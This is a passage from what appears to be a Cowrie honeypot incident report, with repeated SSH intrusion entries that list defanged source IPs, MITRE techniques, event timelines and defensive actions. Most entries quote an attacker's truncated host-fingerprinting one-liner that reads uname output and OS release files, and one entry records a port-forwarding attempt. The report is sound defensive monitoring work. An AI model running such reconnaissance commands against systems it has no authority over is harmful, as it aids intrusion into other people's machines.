| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:02:56` | `cowrie.session.connect` |
| `2026-07-26 07:02:56` | `cowrie.client.version` |
| `2026-07-26 07:02:56` | `cowrie.client.kex` |
| `2026-07-26 07:02:58` | `cowrie.login.success` |
| `2026-07-26 07:02:59` | `cowrie.session.params` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.success` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:02:59` | `cowrie.command.input` |
| `2026-07-26 07:03:00` | `cowrie.log.closed` |
| `2026-07-26 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083644be76b5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:04 |
| **Last Seen** | 2026-07-26 07:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:04:46` | `cowrie.session.connect` |
| `2026-07-26 07:04:46` | `cowrie.client.version` |
| `2026-07-26 07:04:46` | `cowrie.client.kex` |
| `2026-07-26 07:04:48` | `cowrie.login.success` |
| `2026-07-26 07:04:50` | `cowrie.session.params` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.success` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.command.input` |
| `2026-07-26 07:04:50` | `cowrie.log.closed` |
| `2026-07-26 07:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ddb8c85f6f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:06 |
| **Last Seen** | 2026-07-26 07:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:06:31` | `cowrie.session.connect` |
| `2026-07-26 07:06:31` | `cowrie.client.version` |
| `2026-07-26 07:06:31` | `cowrie.client.kex` |
| `2026-07-26 07:06:33` | `cowrie.login.success` |
| `2026-07-26 07:06:34` | `cowrie.session.params` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.success` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.command.input` |
| `2026-07-26 07:06:34` | `cowrie.log.closed` |
| `2026-07-26 07:06:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50120d2d303

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:08 |
| **Last Seen** | 2026-07-26 07:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:08:15` | `cowrie.session.connect` |
| `2026-07-26 07:08:15` | `cowrie.client.version` |
| `2026-07-26 07:08:15` | `cowrie.client.kex` |
| `2026-07-26 07:08:17` | `cowrie.login.success` |
| `2026-07-26 07:08:19` | `cowrie.session.params` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.success` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.command.input` |
| `2026-07-26 07:08:19` | `cowrie.log.closed` |
| `2026-07-26 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265ca98f1982

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:10 |
| **Last Seen** | 2026-07-26 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:10:02` | `cowrie.session.connect` |
| `2026-07-26 07:10:02` | `cowrie.client.version` |
| `2026-07-26 07:10:02` | `cowrie.client.kex` |
| `2026-07-26 07:10:04` | `cowrie.login.success` |
| `2026-07-26 07:10:05` | `cowrie.session.params` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.success` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:05` | `cowrie.command.input` |
| `2026-07-26 07:10:06` | `cowrie.log.closed` |
| `2026-07-26 07:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e08f6bef91

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-07-26 07:10 |
| **Last Seen** | 2026-07-26 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:10:31` | `cowrie.session.connect` |
| `2026-07-26 07:10:31` | `cowrie.client.version` |
| `2026-07-26 07:10:31` | `cowrie.client.kex` |
| `2026-07-26 07:10:31` | `cowrie.login.success` |
| `2026-07-26 07:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06942ad8bc5a

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-26 07:10 |
| **Last Seen** | 2026-07-26 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:10:31` | `cowrie.session.connect` |
| `2026-07-26 07:10:31` | `cowrie.client.version` |
| `2026-07-26 07:10:31` | `cowrie.client.kex` |
| `2026-07-26 07:10:31` | `cowrie.login.success` |
| `2026-07-26 07:10:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2ed09b3fcd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:11 |
| **Last Seen** | 2026-07-26 07:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:11:51` | `cowrie.session.connect` |
| `2026-07-26 07:11:51` | `cowrie.client.version` |
| `2026-07-26 07:11:51` | `cowrie.client.kex` |
| `2026-07-26 07:11:53` | `cowrie.login.success` |
| `2026-07-26 07:11:54` | `cowrie.session.params` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.success` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.command.input` |
| `2026-07-26 07:11:54` | `cowrie.log.closed` |
| `2026-07-26 07:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24be02972753

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:13 |
| **Last Seen** | 2026-07-26 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:13:46` | `cowrie.session.connect` |
| `2026-07-26 07:13:46` | `cowrie.client.version` |
| `2026-07-26 07:13:46` | `cowrie.client.kex` |
| `2026-07-26 07:13:47` | `cowrie.login.success` |
| `2026-07-26 07:13:48` | `cowrie.session.params` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.success` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:48` | `cowrie.command.input` |
| `2026-07-26 07:13:49` | `cowrie.log.closed` |
| `2026-07-26 07:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0dc3c93520

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:15 |
| **Last Seen** | 2026-07-26 07:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:15:34` | `cowrie.session.connect` |
| `2026-07-26 07:15:34` | `cowrie.client.version` |
| `2026-07-26 07:15:34` | `cowrie.client.kex` |
| `2026-07-26 07:15:36` | `cowrie.login.success` |
| `2026-07-26 07:15:38` | `cowrie.session.params` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.success` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:38` | `cowrie.command.input` |
| `2026-07-26 07:15:39` | `cowrie.log.closed` |
| `2026-07-26 07:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4483a07d263a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:17 |
| **Last Seen** | 2026-07-26 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:17:19` | `cowrie.session.connect` |
| `2026-07-26 07:17:19` | `cowrie.client.version` |
| `2026-07-26 07:17:19` | `cowrie.client.kex` |
| `2026-07-26 07:17:21` | `cowrie.login.success` |
| `2026-07-26 07:17:23` | `cowrie.session.params` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.success` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.command.input` |
| `2026-07-26 07:17:23` | `cowrie.log.closed` |
| `2026-07-26 07:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b032e8c7ab4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:19 |
| **Last Seen** | 2026-07-26 07:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:19:03` | `cowrie.session.connect` |
| `2026-07-26 07:19:04` | `cowrie.client.version` |
| `2026-07-26 07:19:04` | `cowrie.client.kex` |
| `2026-07-26 07:19:05` | `cowrie.login.success` |
| `2026-07-26 07:19:07` | `cowrie.session.params` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.success` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.command.input` |
| `2026-07-26 07:19:07` | `cowrie.log.closed` |
| `2026-07-26 07:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7020920eb0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:20 |
| **Last Seen** | 2026-07-26 07:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:20:53` | `cowrie.session.connect` |
| `2026-07-26 07:20:54` | `cowrie.client.version` |
| `2026-07-26 07:20:54` | `cowrie.client.kex` |
| `2026-07-26 07:20:55` | `cowrie.login.success` |
| `2026-07-26 07:20:57` | `cowrie.session.params` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.success` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:57` | `cowrie.command.input` |
| `2026-07-26 07:20:58` | `cowrie.log.closed` |
| `2026-07-26 07:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e66e40ba193

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]61` |
| **First Seen** | 2026-07-26 07:21 |
| **Last Seen** | 2026-07-26 07:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:21:07` | `cowrie.session.connect` |
| `2026-07-26 07:21:07` | `cowrie.client.version` |
| `2026-07-26 07:21:07` | `cowrie.client.kex` |
| `2026-07-26 07:21:09` | `cowrie.login.success` |
| `2026-07-26 07:21:09` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]61` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce8f5ee327ab

